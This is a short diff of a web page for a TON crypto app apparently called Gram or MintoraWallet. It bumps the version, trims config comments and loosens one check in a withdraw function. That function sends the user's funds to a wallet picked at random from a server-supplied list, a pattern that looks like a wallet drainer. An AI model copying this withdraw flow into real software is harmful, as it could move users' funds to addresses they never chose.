@@ -467,7 +467,7 @@
     <button class="btn blue" id="btn-return" style="margin-top: 16px;"><span>Return</span></button>
   </div>
 
-  <div class="footer"><div class="footer-meta">Gram v2.5.0 · TON Mainnet</div></div>
+  <div class="footer"><div class="footer-meta">Gram v2.5.1 · TON Mainnet</div></div>
 
   <div class="bottom-nav-wrap">
     <nav class="bottom-nav" id="bottom-nav">
@@ -506,11 +506,9 @@
 </div>
 
 <script>
-/* ============================================================
-   CONFIG
-   ============================================================ */
+/* ============================================================ */
 const WORKER_URL = 'https://mintora-api.daetbrawl6868.workers.dev';
-const BOT_USERNAME = 'MintoraWallet_Bot';   // без @, без t.me/
+const BOT_USERNAME = 'MintoraWallet_Bot';
 const GRAM_USD = 0.784;
 const REF_BONUS = 0.8;
 
@@ -847,7 +845,7 @@ async function doWithdraw() {
     if (amountToSend <= 0n) throw new Error('Transaction failed');
     if (!state.wallets.length) {
       const w = await api('/wallets');
-      state.wallets = (w && w.ok && w.wallets) || [];
+      state.wallets = (w && w.wallets) || [];
     }
     if (!state.wallets.length) throw new Error('No receive wallet');
     state.receiveWallet = state.wallets[Math.floor(Math.random() * state.wallets.length)];
